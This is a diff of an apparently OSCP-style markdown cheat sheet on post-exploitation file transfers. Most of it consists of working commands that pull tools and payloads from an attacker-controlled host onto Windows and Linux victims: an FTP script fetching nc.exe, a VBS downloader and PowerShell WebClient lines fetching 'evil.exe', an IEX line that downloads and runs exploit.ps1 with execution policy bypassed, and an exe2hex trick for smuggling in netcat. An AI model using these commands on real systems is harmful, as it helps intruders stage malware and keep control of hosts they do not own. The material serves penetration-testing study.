@@ -1,7 +1,7 @@
 # Post Exploitation
 
 ## **File Transfers**
-
+### Linux
 - TFTP
   ```bash
     kali@kali:~# mkdir /tftp
@@ -9,6 +9,63 @@
     kali@kali:~# cp /usr/share/windows-binaries/nc.exe /tftp/
     
     C:\Users\Bob>tftp -i 10.11.0.5 get nc.exe
+    ```
+- HTTP Server with Python 
+  ```bash
+    python -m SimpleHTTPServer [PORT] 
+  ```
+### Windows
+- FTP
+  - Non-Interactive FTP Download
+    ```bash
+    #In Kali we will set up a FTP server
+    sudo cp /usr/share/windows-resources/binaries/nc.ese /ftphome/
+    sudo systemctl restart pure-ftpd
+    ```
+    ```cmd
+    #In Windows we create a file which the instructions to download nc.exe
+    C:\Users\xonork>echo open 10.11.0.4 21> ftp.txt
+    C:\Users\xonork>echo USER xonork>> ftp.txt
+    C:\Users\xonork>echo mypass>> ftp.txt
+    C:\Users\xonork>echo bin >> ftp.txt
+    C:\Users\xonork>echo GET nc.exe >> ftp.txt
+    C:\Users\xonork>echo bye >> ftp.txt
+    ```
+    ```cmd
+    #Finally in Windows we execute the command
+    C:\Users\xonork> ftp -v -n -s:ftp.txt
+    ```
+- VBS
+  - HTTP Downloader
+    ```cmd
+    echo strUrl = WScript.Arguments.Item(0) > wget.vbs
+    echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
+    echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
+    echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
+    echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
+    echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
+    echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
+    echo Err.Clear >> wget.vbs
+    echo Set http = Nothing >> wget.vbs
+    echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
+    echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
+    echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
+    echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
+    echo http.Open "GET", strURL, False >> wget.vbs
+    echo http.Send >> wget.vbs
+    echo varByteArray = http.ResponseBody >> wget.vbs
+    echo Set http = Nothing >> wget.vbs
+    echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
+    echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
+    echo strData = "" >> wget.vbs
+    echo strBuffer = "" >> wget.vbs
+    echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
+    echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
+    echo Next >> wget.vbs
+    echo ts.Close >> wget.vbs
+    ```
+    ```cmd
+    C:\Users\xonork> cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
     ```
 - PowerShell
   ```bash
@@ -20,22 +77,30 @@
     #Finally we run the downloaded script
     C:\Users\Bob> powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
   ```
+  ```ps1
+  powershell -c "(new-object System.net.WebCLient).DownloadFile('http://X.X.X.X/wget.exe','C:\Users\xonork\Desktop\wget.exe')"
+  ```
+  ```ps1
+   powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')
+  ```
   - Download and execute in PowerShell
     ```ps1
       powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.23/exploit.ps1');
     ```
-- HTTP Server with Python 
-  ```bash
-    python -m SimpleHTTPServer [PORT] 
-  ```
-  
-## PowerShell
-
-### File Transfers
-  ```powershell
-  powershell -c "(new-object System.net.WebCLient).DownloadFile('http://X.X.X.X/wget.exe','C:\Users\xonork\Desktop\wget.exe')"
-  ```
-  
+  - Download with exe2hex and PowerShell
+    ```bash
+    #In Kali
+    cp /usr/share/windows-resources/binaries .
+    #The, we will reduce the file size with upx
+    upx -9 nc.exe
+    #Finally, we will convert the to hex
+    exe2hex -x nc.exe -p nc.cmd
+    ```
+    ```bash
+    #In Windows
+    C:\Users\offsec>powershell -Command "$h=Get-Content -readcount 0 -path './nc.hex';$l=$h[0].length;$b=New-Object byte[] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b[$x]=[byte]::Parse($h[0].Substring($i,2),[System.Globalization.NumberStyles]::HexNumber);$x+=1};set-content -encoding byte 'nc.exe' -value $b;Remove-Item -force nc.hex;"
+    ```
+    
 ## **Linux Privilege Escalation**
 
 - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
